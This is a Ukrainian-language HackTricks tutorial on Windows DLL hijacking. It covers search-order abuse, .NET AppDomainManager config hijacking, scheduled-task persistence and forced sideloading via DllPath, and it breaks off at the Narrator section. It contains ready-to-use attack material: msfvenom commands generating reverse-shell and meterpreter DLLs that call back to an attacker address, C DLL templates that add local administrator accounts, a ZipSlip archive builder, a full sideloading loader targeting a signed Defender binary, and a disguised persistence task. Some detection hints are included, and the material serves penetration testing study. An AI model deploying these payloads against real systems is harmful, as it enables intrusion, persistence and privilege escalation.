# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking полягає в тому, щоб змусити довірену програму завантажити шкідливу DLL. Цей термін охоплює кілька тактик, як-от **DLL Spoofing, Injection і Side-Loading**. Його переважно використовують для виконання коду, забезпечення persistence і, рідше, підвищення привілеїв. Попри те, що тут основна увага приділяється підвищенню привілеїв, метод hijacking залишається однаковим для різних цілей.

### Поширені техніки

Для DLL hijacking застосовують кілька методів; ефективність кожного залежить від стратегії завантаження DLL у програмі:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Заміна справжньої DLL на шкідливу, за потреби з використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: Розміщення шкідливої DLL у шляху пошуку, який має пріоритет над шляхом до легітимної DLL, із використанням порядку пошуку програми.
3. **Phantom DLL Hijacking**: Створення шкідливої DLL, яку програма завантажить, вважаючи її потрібною DLL, якої не існує.
4. **DLL Redirection**: Зміна параметрів пошуку, наприклад `%PATH%`, або файлів `.exe.manifest` / `.exe.local`, щоб спрямувати програму до шкідливої DLL.
5. **WinSxS DLL Replacement**: Заміна легітимної DLL на шкідливу копію в каталозі WinSxS; цей метод часто пов'язаний із DLL side-loading.
6. **Relative Path DLL Hijacking**: Розміщення шкідливої DLL у контрольованому користувачем каталозі разом із копією програми, що нагадує техніки Binary Proxy Execution.

Програма також може реалізовувати **власний завантажувач DLL**. Привілейований процес може переглядати дочірній каталог, наприклад `Libraries` або `Plugins`, і передавати вибрану DLL допоміжній програмі незалежно від звичайного порядку пошуку DLL у Windows. Якщо інший обліковий запис може створювати файли саме в цьому каталозі, розглядайте це як напрям для перевірки: з'ясуйте ідентичність процесу, ефективні ACL каталогу, правило вибору файлів і наявність доступного шляху до завантаження. Можливість запису в каталог поруч із виконуваним файлом сама по собі не доводить, що процес завантажує звідти DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Класичний DLL sideloading — не єдиний спосіб змусити довірений процес **.NET Framework** завантажити код зловмисника. Якщо цільовий виконуваний файл є **керованою** програмою, CLR також перевіряє **файл конфігурації програми**, назва якого відповідає назві виконуваного файлу (наприклад, `Setup.exe.config`). У цьому файлі можна визначити власний **AppDomainManager**. Якщо конфігурація вказує на контрольовану зловмисником збірку, розміщену поруч із EXE, CLR завантажує її **до звичайного шляху виконання коду програми**, і вона виконується в довіреному процесі.<sup>[[24]](#references)</sup>

Згідно зі схемою конфігурації .NET Framework від Microsoft, для використання власного менеджера мають бути наявні обидва елементи: `<appDomainManagerAssembly>` і `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Мінімальна конфігурація:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Мінімальний менеджер:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Практичні примітки:
- Це прийом, специфічний для **.NET Framework**. Він використовує розбір конфігурації CLR, а не порядок пошуку DLL у Win32.
- Хост має бути справжнім **керованим EXE**. Швидка перевірка: `sigcheck -m target.exe`, `corflags target.exe` або пошук **CLR Runtime Header** у метаданих PE.
- Ім’я файлу конфігурації має точно відповідати імені виконуваного файлу (`<binary>.config`); зазвичай він міститься **поруч із EXE**.
- Це корисно для **підписаних бінарних файлів Microsoft/постачальників**, оскільки довірений EXE залишається незмінним, а шкідлива керована збірка виконується в тому самому процесі.
- Якщо у вас уже є доступний для запису каталог інсталятора/оновлення, AppDomainManager hijacking можна використати як **перший етап**, а потім застосувати класичне DLL sideloading або reflective loading для наступних етапів.

### AppDomainManager як downloader і bootstrap для scheduled task

Практичний шаблон вторгнення — поєднати довірений керований EXE зі шкідливими `*.config` і DLL AppDomainManager, яка слугує лише **невеликим bootstrapper**:<sup>[[25]](#references)</sup>

1. Користувач запускає підписаний інсталятор або оновлювач .NET із правдоподібного розташування, наприклад `%USERPROFILE%\Downloads`.
2. Суміжний файл конфігурації змушує CLR завантажити збірку зловмисника **до запуску логіки легітимної програми**.
3. Шкідливий менеджер виконує **перевірку шляху** (наприклад, продовжує роботу, лише якщо хостовий EXE запущено з `Downloads`, і дозволяє виконати другий етап лише з `%LOCALAPPDATA%`).
4. Якщо перевірка пройдена, він завантажує справжнє корисне навантаження до доступного для запису користувачем шляху, наприклад `%LOCALAPPDATA%\PerfWatson2.exe`, і налаштовує персистентність за допомогою scheduled task.

Чому цей варіант важливий:
- Підписаний хостовий EXE залишається незмінним, тому перевірка, яка хешує лише основний бінарний файл, може не виявити компрометацію.
- Простий **антианаліз на основі шляху** трапляється часто: переміщення ZIP/EXE/DLL тріади на Desktop, у Temp або до шляху пісочниці може навмисно перервати ланцюжок.
- DLL AppDomainManager першого етапу може залишатися маленькою й малопомітною, поки справжній імплант завантажується пізніше.

Мінімальний приклад персистентності, який часто трапляється з цим шаблоном:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Примітки:
- ` /rl highest` означає **найвищий доступний рівень** для цього користувача/сеансу; сам по собі він не гарантує підвищення привілеїв до SYSTEM.
- Цю техніку зазвичай краще класифікувати як **виконання/закріплення через зловживання конфігурацією .NET**, а не як класичний hijacking через відсутню DLL і порядок пошуку, хоча оператори часто комбінують обидва методи.

Орієнтири для виявлення:
- Підписані виконувані файли .NET, запущені з **шляхів розпакування ZIP-архівів**, `Downloads`, `%TEMP%` або інших доступних для запису користувачеві папок, поруч із якими розташовано файл `<exe>.config`.
- Нові заплановані завдання, дія яких вказує на `%LOCALAPPDATA%`, `%APPDATA%` або `Downloads`, а назви імітують засоби оновлення браузерів/виробників.
- Короткочасні керовані процеси-завантажувачі, які одразу завантажують інший EXE, а потім запускають `schtasks.exe`.
- Зразки, які достроково завершують роботу, якщо шлях до виконуваного файлу не відповідає очікуваній папці профілю користувача.

### Hijacking наявного запланованого завдання для повторного запуску ланцюжка sideload

Для закріплення не обмежуйтеся пошуком **створення нового завдання**. Деякі групи зловмисників чекають, доки легітимний інсталятор створить **звичайне завдання оновлення**, а потім **переписують дію завдання**, щоб його наявні назва, автор і тригер залишалися знайомими захисникам.

Типовий сценарій:
1. Установіть/запустіть легітимне програмне забезпечення та визначте завдання, яке воно зазвичай створює.
2. Експортуйте XML завдання та занотуйте поточні значення `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Замініть лише дію, щоб завдання запускало ваш **довірений EXE-хост** із проміжної папки, доступної для запису користувачеві; той виконає side-load або завантажить корисне навантаження через AppDomain.
4. Повторно зареєструйте завдання під тією самою назвою, а не створюйте новий, очевидний артефакт закріплення.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Чому це непомітніше:
- Назва завдання все ще може виглядати легітимною (наприклад, як програма оновлення від виробника).
- Його запускає служба **Task Scheduler**, тож перевірка батьківського процесу або предків часто бачить очікуваний ланцюжок планувальника, а не `explorer.exe`.
- Команди DFIR, які шукають лише **нові назви завдань**, можуть пропустити завдання, яке вже було зареєстроване, але тепер вказує на `%LOCALAPPDATA%`, `%APPDATA%` або інший контрольований зловмисником шлях.

Швидкі напрямки пошуку:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Порівнюйте XML-файли в `C:\Windows\System32\Tasks\*` і метадані в `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` з базовою версією.
- Створюйте сповіщення, коли завдання **оновлення, схоже на завдання виробника**, запускається з **каталогів, доступних для запису користувачам**, або запускає .NET EXE разом із файлом `*.config` у тому самому каталозі.

> [!TIP]
> Щоб переглянути покроковий ланцюжок, який поєднує HTML staging, конфігурації AES-CTR і .NET implants із DLL sideloading, ознайомтеся з наведеним нижче процесом.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Пошук відсутніх DLL

Найпоширеніший спосіб знайти відсутні DLL у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із пакета sysinternals і **встановити** **такі 2 фільтри**:

![Common Techniques - Пошук відсутніх DLL: Найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon із пакета sysinternals і встановити такі 2 фільтри](<../../../images/image (961).png>)

![Common Techniques - Пошук відсутніх DLL: Найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon із пакета sysinternals і встановити такі 2 фільтри](<../../../images/image (230).png>)

і просто відображати **File System Activity**:

![Common Techniques - Пошук відсутніх DLL: і просто відображати File System Activity](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні DLL загалом**, залиште це працювати на кілька **секунд**.\
Якщо ви шукаєте **відсутню DLL у конкретному виконуваному файлі**, додайте ще один фільтр, наприклад **"Process Name" "contains" `<exec name>`**, запустіть його й зупиніть збір подій.<sup>[[9]](#references)</sup>

## Експлуатація відсутніх DLL

Щоб підвищити привілеї, знайдіть **DLL, яку привілейований процес намагається завантажити** з місця, доступного вам для запису. Це може статися, якщо ви контролюєте каталог, який шукається раніше за каталог із легітимною DLL, або якщо запитаної DLL немає, а ви можете записувати в один із каталогів пошуку.

### Порядок пошуку DLL

**У** [**документації Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна дізнатися, як саме завантажуються DLL.**

**Програми Windows** шукають DLL за визначеним набором **шляхів пошуку**, дотримуючись певної послідовності. Проблема DLL hijacking виникає, коли шкідливу DLL стратегічно розміщують в одному з цих каталогів, щоб її було завантажено раніше за справжню DLL. Щоб цьому запобігти, програма має використовувати абсолютні шляхи для DLL, які їй потрібні.

Нижче наведено **порядок пошуку DLL у 32-бітних** системах:

1. Каталог, з якого завантажено програму.
2. Системний каталог. Щоб отримати шлях до цього каталогу, скористайтеся функцією [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya).(_C:\Windows\System32_)
3. 16-бітний системний каталог. Функції для отримання шляху до цього каталогу немає, але пошук у ньому виконується. (_C:\Windows\System_)
4. Каталог Windows. Щоб отримати шлях до цього каталогу, скористайтеся функцією [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya).
   1. (_C:\Windows_)
5. Поточний каталог.
6. Каталоги, перелічені в змінній середовища PATH. Зверніть увагу: сюди не входить шлях для окремої програми, заданий у розділі реєстру **App Paths**. Розділ **App Paths** не використовується під час обчислення шляху пошуку DLL.

Це **стандартний** порядок пошуку, коли ввімкнено **SafeDllSearchMode**. Якщо цей режим вимкнено, поточний каталог переміщується на друге місце. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і задайте йому значення 0 (за замовчуванням функцію ввімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликано з параметром **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі виконуваного модуля, який завантажує **LoadLibraryEx**.

Нарешті, DLL можна завантажити за абсолютним шляхом, а не за назвою. У такому разі Windows шукає саму DLL лише за цим шляхом; залежності, запитані за назвою, усе одно шукаються відповідно до застосовного порядку пошуку.

Є й інші способи змінити порядок пошуку, але тут я їх пояснювати не буду.

### Поєднання довільного запису файлу з перехопленням відсутньої DLL

**Пов’язана техніка:** [перемикання точки монтування під захистом oplock проти привілейованого механізму усунення проблем](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Використайте фільтри **ProcMon** (`Process Name` = цільовий EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`), щоб зібрати назви DLL, які процес шукає, але не знаходить.<sup>[[14]](#references)</sup>
2. Якщо бінарний файл запускається **за розкладом/як служба**, достатньо помістити DLL з однією з цих назв у **каталог програми** (пункт №1 у порядку пошуку), і її буде завантажено під час наступного запуску. В одному випадку з .NET scanner процес шукав `hostfxr.dll` у `C:\samples\app\` перед тим, як завантажити справжню копію з `C:\Program Files\dotnet\fxr\...`.
3. Створіть payload DLL (наприклад, reverse shell) з будь-яким експортом: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваш примітив — це **довільний запис файлу на кшталт ZipSlip**, створіть ZIP-файл із записом, який виходить за межі каталогу розпакування, щоб DLL потрапила до каталогу програми:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Доставте архів до контрольованої папки «Вхідні»/спільної папки; коли заплановане завдання повторно запустить процес, він завантажить шкідливу DLL і виконає ваш код від імені облікового запису служби.

### Примусове sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath

Розширений спосіб детерміновано вплинути на шлях пошуку DLL у новоствореному процесі — задати поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою нативних API ntdll. Якщо вказати контрольований зловмисником каталог, цільовий процес, який знаходить імпортовану DLL за назвою (без абсолютного шляху й без безпечних прапорців завантаження), можна змусити завантажити шкідливу DLL із цього каталогу.

Основна ідея
- Створіть параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть власний DllPath, що веде до контрольованої вами папки (наприклад, каталогу, де міститься ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий бінарний файл шукатиме DLL за назвою, завантажувач під час пошуку звернеться до вказаного DllPath, що забезпечить надійне sideloading, навіть якщо шкідлива DLL не розташована поруч із цільовим EXE.

Примітки та обмеження
- Це впливає на дочірній процес, який створюється; це відрізняється від SetDllDirectory, що впливає лише на поточний процес.
- Цільовий процес має імпортувати DLL або викликати LoadLibrary для DLL за назвою (без абсолютного шляху й без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко задані абсолютні шляхи не можна перехопити. Forwarded exports і SxS можуть змінити порядок пріоритету.

Мінімальний приклад на C (ntdll, wide strings, спрощена обробка помилок):

<details>
<summary>Повний приклад на C: примусове DLL sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Приклад використання
- Помістіть шкідливий xmllite.dll (що експортує потрібні функції або перенаправляє виклики до справжньої DLL) у каталог DllPath.
- Запустіть підписаний бінарний файл, який, як відомо, шукає xmllite.dll за іменем за допомогою описаної вище техніки. Завантажувач знаходить імпорт через указаний DllPath і виконує sideloading вашої DLL.

Цю техніку спостерігали в реальних атаках як спосіб запуску багатоетапних ланцюжків sideloading: початковий завантажувач скидає допоміжну DLL, яка потім запускає підписаний Microsoft бінарний файл, вразливий до hijacking, із власним DllPath, щоб примусово завантажити DLL зловмисника з проміжного каталогу.<sup>[[6]](#references)</sup>


### Hijacking .NET AppDomainManager через `.exe.config`

Для цілей на **.NET Framework** sideloading можна виконати **до `Main()`**, не змінюючи пам’ять, зловживаючи сусіднім файлом **`.exe.config`** програми. Замість того щоб покладатися лише на порядок пошуку Win32 DLL, зловмисник розміщує легітимний .NET EXE поруч зі шкідливим файлом конфігурації та однією чи кількома контрольованими зловмисником збірками.

Як працює ланцюжок:<sup>[[15]](#references)[[22]](#references)</sup>
1. Запускається EXE-хост, і **CLR читає `<exe>.config`**.
2. У конфігурації задаються **`<appDomainManagerAssembly>`** і **`<appDomainManagerType>`**, щоб середовище виконання створило контрольований зловмисником `AppDomainManager`.
3. Шкідливий менеджер отримує можливість виконання **до `Main()`** у довіреному процесі-хості.
4. Та сама конфігурація може змусити CLR спочатку шукати локальні збірки (наприклад, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), а також послабити перевірки середовища виконання та телеметрію без inline patching.

Типовий шаблон для кампаній (точна вкладеність може відрізнятися залежно від директиви та версії CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Чому це корисно:
- **`<probing privatePath="."/>`** обмежує пошук збірок каталогом програми, перетворюючи цю папку на передбачувану поверхню для sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** запускають код зловмисника під час ініціалізації CLR, ще до запуску легітимної логіки програми.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** може дозволити програмі з повним рівнем довіри завантажувати непідписані або змінені збірки без помилки перевірки strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** запобігає перенаправленню політикою видавця на новіші збірки.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** робить вибір середовища виконання більш передбачуваним.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** особливо цікаве, оскільки **CLR вимикає власну видимість через ETW** за допомогою конфігурації, замість того щоб імплант змінював `EtwEventWrite` у пам’яті.

Операційна схема, що траплялася в нещодавніх кампаніях:
- Етап 1: розміщення `setup.exe`, `setup.exe.config` і локальних збірок.
- Етап 2: копіювання їх у правдоподібну папку **AppData update**, перейменування виконуваного файла на щось на кшталт `update.exe` і повторний запуск через **заплановане завдання**.
- Етап 3: перевірка контексту виконання (наприклад, очікуваного батьківського процесу `svchost.exe` від Task Scheduler) перед завантаженням кінцевої RAT DLL/експорту.

Що шукати:
- Підписані або іншим чином легітимні **виконувані файли .NET**, що запускаються з підозрілими файлами **`.config`** поруч у доступних для запису користувачем розташуваннях.
- Файли `.config`, що містять **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** або **`etwEnable enabled="false"`**.
- Заплановані завдання, що повторно запускають перейменовані бінарні файли оновлення з **`%LOCALAPPDATA%`** або каталогів програми на кшталт `\bin\update\`.
- Ланцюжки батьківських і дочірніх процесів, у яких заплановане завдання запускає довірений хост .NET, що відразу завантажує збірки не від виробника з власного каталогу.

#### Винятки з порядку пошуку DLL у документації Windows

У документації Windows зазначено певні винятки зі стандартного порядку пошуку DLL:

- Якщо виявлено **DLL з іменем, що збігається з іменем уже завантаженої в пам’ять DLL**, система обходить звичайний пошук. Натомість вона перевіряє наявність перенаправлення та маніфесту, а потім за замовчуванням використовує DLL, уже наявну в пам’яті. **У цьому сценарії система не шукає DLL**.
- Якщо DLL розпізнано як **відому DLL** для поточної версії Windows, система використовує свою версію цієї DLL разом із будь-якими залежними від неї DLL, **не виконуючи пошук**. Реєстровий ключ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих відомих DLL.
- Якщо **DLL має залежності**, пошук залежних DLL виконується так, ніби вони вказані лише за своїми **іменами модулів**, незалежно від того, чи було початкову DLL знайдено за повним шляхом.

### Підвищення привілеїв

**Вимоги**:

- Знайти процес, який працює або працюватиме з **іншими привілеями** (горизонтальне або латеральне переміщення) і якому **бракує DLL**.
- Переконатися, що є **доступ на запис** до будь-якого **каталогу**, у якому виконуватиметься **пошук DLL**. Це може бути каталог виконуваного файла або каталог у системному шляху.

За замовчуванням такі умови трапляються рідко: привілейовані виконувані файли зазвичай не мають відсутніх залежностей DLL, а звичайні користувачі зазвичай не можуть записувати у каталоги системного шляху пошуку. Однак неправильно налаштовані середовища можуть мати обидві проблеми.\
Якщо вимоги виконано, перегляньте проєкт [UACME](https://github.com/hfiref0x/UACME). Хоча його основна мета — обхід UAC, він містить PoC для DLL hijacking у певних версіях Windows, які часто можна адаптувати до знайденого каталогу, доступного для запису.

Зверніть увагу, що **перевірити свої дозволи в папці** можна так:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

А також **перевірте дозволи всіх папок у PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Також можна перевірити імпорти виконуваного файла й експорти DLL за допомогою:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Для повного посібника про те, як **зловживати DLL Hijacking для підвищення привілеїв**, маючи дозволи на запис до папки **System Path**, дивіться:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте ви дозволи на запис до будь-якої папки в системному PATH.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості — це функції **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._

### Приклад

Якщо ви знайшли сценарій, який можна експлуатувати, для успішної експлуатації найважливіше **створити DLL, яка експортує щонайменше всі функції, які виконуваний файл імпортуватиме з неї**. У будь-якому разі майте на увазі, що DLL Hijacking може стати в пригоді, щоб [підвищити рівень цілісності із Medium до High **(обійшовши UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity до SYSTEM**](../index.html#from-high-integrity-to-system)**.** Приклад **створення коректної DLL** можна знайти в цьому дослідженні DLL hijacking, присвяченому виконанню коду через DLL hijacking: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступному розділі** ви знайдете кілька **базових прикладів коду DLL**, які можуть бути корисними як **шаблони** або для створення **DLL з експортованими функціями, які не є обов’язковими**.

## **Створення та компіляція DLL**

### **Проксіювання DLL**

Загалом, **DLL-проксі** — це DLL, яка може **виконувати ваш шкідливий код під час завантаження**, а також **відкривати функції** та **працювати** як **очікується**, **перенаправляючи всі виклики до справжньої бібліотеки**.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) можна **вказати виконуваний файл і вибрати бібліотеку** для проксіювання, а потім **згенерувати проксі-DLL**; або **вказати DLL** і **згенерувати проксі-DLL**.

### **Meterpreter**

**Отримання rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Отримати meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Створення користувача (x86, версії x64 я не бачив):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Власна DLL

У багатьох випадках DLL, яку ви компілюєте, має **експортувати кожну функцію, яку імпортує процес-жертва**. Якщо потрібного експорту немає, бінарний файл не зможе його знайти, і експлойт не спрацює.

<details>
<summary>Шаблон DLL на C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Альтернативна C DLL із точкою входу потоку</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Практичний приклад: DLL Hijack бібліотеки локалізації Narrator OneCore TTS (спеціальні можливості/ATs)

Windows Narrator.exe і досі під час запуску перевіряє передбачувану DLL локалізації для конкретної мови, яку можна перехопити для довільного виконання коду та закріплення в системі.<sup>[[7]](#references)</sup>

Ключові факти
- Шлях перевірки (поточні збірки): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Шлях у старих версіях (старіші збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо за шляхом OneCore є доступна для запису DLL під контролем зловмисника, її буде завантажено, а `DllMain(DLL_PROCESS_ATTACH)` виконається. Експорти не потрібні.

Виявлення за допомогою Procmon
